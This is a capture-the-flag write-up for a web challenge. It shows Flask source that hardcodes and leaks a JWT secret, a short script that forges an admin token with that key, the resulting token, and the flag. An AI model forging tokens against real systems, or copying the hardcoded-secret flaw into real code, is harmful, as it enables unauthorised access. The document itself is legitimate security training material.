# Key Heist Level 1

## Category: Web

## Challenge Description
We just needed to edit the cookies to bypass the access to admin. We access token using this modifying the given source code.

## Solution

### Source Code Analysis

```python
from flask import Flask, render_template, request, redirect, make_response
import jwt
import random
from datetime import datetime, timedelta

app = Flask(__name__)
SECRET_KEY = "dev_internal_key"

TROLL_MESSAGES = [
    "You won't find that here.",
    "The key always belonged to me.",
    "I won't be the only one betrayed by the organization.",
    "Nice try. But this door doesn't open for you.",
    "Curiosity can be dangerous.",
    "Some doors require more than credentials."
]

USERS = {
    "user123": "password123",
}

def generate_token(username):
    payload = {
        "username": username,
        "role": "admin" if username == "admin" else "user",
        "exp": datetime.utcnow() + timedelta(minutes=30)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def verify_token(token):
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except:
        return None

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USERS and USERS[username] == password:
            token = generate_token(username)
            response = make_response(redirect("/dashboard"))
            response.set_cookie("auth_token", token)
            response.headers["X-Internal-Trace"] = f"ref={SECRET_KEY}; env=dev"
            return response
    return render_template("login.html")

@app.route("/dashboard")
def dashboard():
    token = request.cookies.get("auth_token")
    if not token:
        return redirect("/")
    payload = verify_token(token)
    if not payload:
        return redirect("/")
    if payload.get("role") == "admin":
        return redirect("/control_panel_v2")
    return render_template("takeover.html")

def render_blocked():
    message = random.choice(TROLL_MESSAGES)
    return render_template("blocked.html", message=message), 403

@app.route("/control_panel_v2")
def admin_panel():
    token = request.cookies.get("auth_token")
    if not token:
        return render_blocked()
    payload = verify_token(token)
    if not payload:
        return render_blocked()
    if payload.get("role") == "admin":
        return render_template("admin.html")
    return render_blocked()

@app.route("/admin")
@app.route("/backup")
@app.route("/internal")
def blocked_routes():
    return render_blocked()

if __name__ == "__main__":
    app.run(debug=True)
```

### Exploit

The source code reveals the `SECRET_KEY = "dev_internal_key"` and uses JWT for authentication. We can forge an admin token using this key.

**Script to generate the access token:**

```python
import jwt
from datetime import datetime, timedelta

payload = {
    "username": "admin",
    "role": "admin",
    "exp": datetime.utcnow() + timedelta(minutes=30)
}
token = jwt.encode(payload, "dev_internal_key", algorithm="HS256")
print(token)
```

Using that we got:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc0Njc0NDk3fQ.wMTrggeGjdV4lgrpPHExuehzbU_fg-4spssp-tDluvI
```

Then we used cookie editor to set the forged token:

![Cookie Editor](image1.png)

After checking the image metadata, we got the flag in comment:

![Metadata Flag](image2.jpeg)

## Flag
```
CIPH{T#!$_iS_jUs+_T#3_B3Gg!Nn!nG}
```
